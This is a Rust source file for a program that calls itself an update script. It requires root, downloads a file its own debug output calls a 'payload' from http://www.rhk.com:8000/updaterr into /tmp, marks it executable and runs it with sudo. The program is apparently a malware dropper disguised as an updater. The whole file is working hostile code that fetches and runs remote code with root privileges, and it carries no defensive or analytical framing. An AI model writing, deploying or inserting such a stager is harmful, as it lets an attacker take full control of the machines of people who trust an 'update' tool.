use clap::Parser;
use colored::Colorize;
use nix::unistd::Uid;
use std::{
    env::{current_dir, set_current_dir},
    fs::{read_dir, set_permissions, File},
    io::{copy, Cursor},
    os::unix::fs::PermissionsExt,
    path::Path,
    process::Command,
};

type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;

#[derive(Parser)]
#[command(version, about)]
struct Args {
    #[arg(short, long)]
    debug: bool,
}

#[tokio::main]
async fn main() -> Result<()> {

    if !Uid::effective().is_root() {
        panic!("{}", "[x] You must run this update script with root permissions!".red().bold());
    }

    let debug: bool = Args::parse().debug;
    if debug {
        println!("[*] Debug mode: {}", "ON".green().bold());
    }

    let target: &str = "http://www.rhk.com:8000/updaterr";

    let temp_path = Path::new("/tmp");
    let change_current_dir = set_current_dir(temp_path);
    if debug {
        if change_current_dir.is_ok() {
            println!("[*] New current directory: {}", "/tmp".cyan().bold());
            println!("[*] Testing listing files...");
            let paths = read_dir(current_dir()?).unwrap();
            for path in paths {
                println!("\t-> {}", path.unwrap().path().display());
            }
            println!("\n[*] Downloading payload at {}", target.cyan().bold());
        } else {
            println!(
                "{}",
                "[-] Error while changing current directory for: /tmp"
                    .red()
                    .bold()
            );
        }
    }

    let filename: &str = "updater";

    let response = reqwest::get(target).await?;
    let mut dest_file = File::create(filename).expect("");
    let mut permissions = dest_file.metadata()?.permissions();

    let mut content = Cursor::new(response.bytes().await?);
    let copy = copy(&mut content, &mut dest_file);

    if debug {
        if copy.is_ok() {
            println!(
                "[*] Payload saved at {}",
                ("/tmp/".to_owned() + filename).cyan().bold()
            );
        } else {
            println!(
                "{}",
                "[-] Error while downloading payload. Check address, port and filename."
                    .red()
                    .bold()
            );
        }
    }

    permissions.set_mode(0o100);
    let _ = set_permissions(filename, permissions.clone());

    if debug {
        println!(
            "[*] Permissions of payload {}: {} (chmod 100)",
            ("/tmp/".to_owned() + filename).cyan().bold(),
            permissions.mode()
        );
        println!("[*] Executing payload...");
    }

    let _ = Command::new("sudo")
        .arg("/tmp/".to_owned() + filename)
        .spawn()
        .expect("error");

    Ok(())
}